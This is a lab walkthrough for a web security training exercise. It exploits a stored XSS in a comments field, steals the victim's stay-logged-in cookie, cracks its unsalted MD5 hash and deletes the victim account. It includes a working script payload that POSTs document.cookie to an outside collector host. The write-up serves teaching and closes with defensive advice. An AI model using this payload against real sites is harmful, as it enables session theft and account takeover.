# LAB: Offline password craingck

## Given:

- Target website stores user passwords as hashes.
- The lab contains an XSS vulnerability in the comments section.
- Credentials provided for `wiener: peter`.
- Target username: `carlos`.

## Objective:

- Obtain the `stay-logged-in` cookie of the target user `carlos`.
- Delete the account of user `carlos`.

## Key Concepts:

- XSS can be used to exfiltrate cookies and session data from other users.
- Persistent login cookies (`stay-logged-in`) may contain sensitive information, such as hashed passwords.
- Weak hashing (e.g., unsalted MD5) makes offline password cracking feasible.

## Steps Taken:

1. Proxy browser traffic through Burp Suite to intercept and analyze requests.
2. Log in with `wiener: peter` and explore the application, noting `/my-account` and the account deletion feature.
3. Observe that deleting an account requires entering the user's password for confirmation.
4. Use Burp Collaborator to generate a unique link for exfiltration.
5. Identify the XSS vulnerability in the comments section (textarea field).
6. Inject the following payload to exfiltrate cookies:
   ```html
   </textarea><script>
   fetch("https://<burp-collaborator-link>", {
     method: "POST",
     body: document.cookie,
     mode: "no-cors"
   })
   </script>
   ```
7. Submit the comment and monitor Burp Collaborator for incoming requests from other users.
8. When a request arrives, extract the session and `stay-logged-in` cookie values for the target user (`carlos`).
9. Decode the `stay-logged-in` cookie (often Base64 encoded). Format is typically `carlos:<hashed_value>`.
10. Attempt to crack the hash using online databases or hash-cracking tools (MD5 in this case).
11. Use the cracked password to log in as `carlos`.
12. Navigate to the account deletion page and enter the cracked password to delete the account.

## Payloads Used:

| Payload # | Purpose                    | Example/Usage                                   |
| --------- | -------------------------- | ----------------------------------------------- |
| 1         | Exfiltrate cookies via XSS | See above HTML/JS payload for Burp Collaborator |

## Issues Encountered:

- Ensuring the XSS payload executed for the target user.
- Decoding and cracking the hash format of the cookie value.

## Solutions/Workarounds:

- Use Burp Collaborator to confirm exfiltration.
- Try multiple hash algorithms and online databases for cracking.

## Takeaways:

- XSS vulnerabilities can be leveraged to steal sensitive cookies and session data.
- Persistent cookies like `stay-logged-in` are a prime target for attackers.
- Weak or predictable cookie formats (e.g., unsalted MD5) are easily cracked offline.
- Always use strong, salted hashes for sensitive data.
- Account management features (like deletion) should require robust authentication.
- Regularly test for XSS and weak cookie management in web applications.
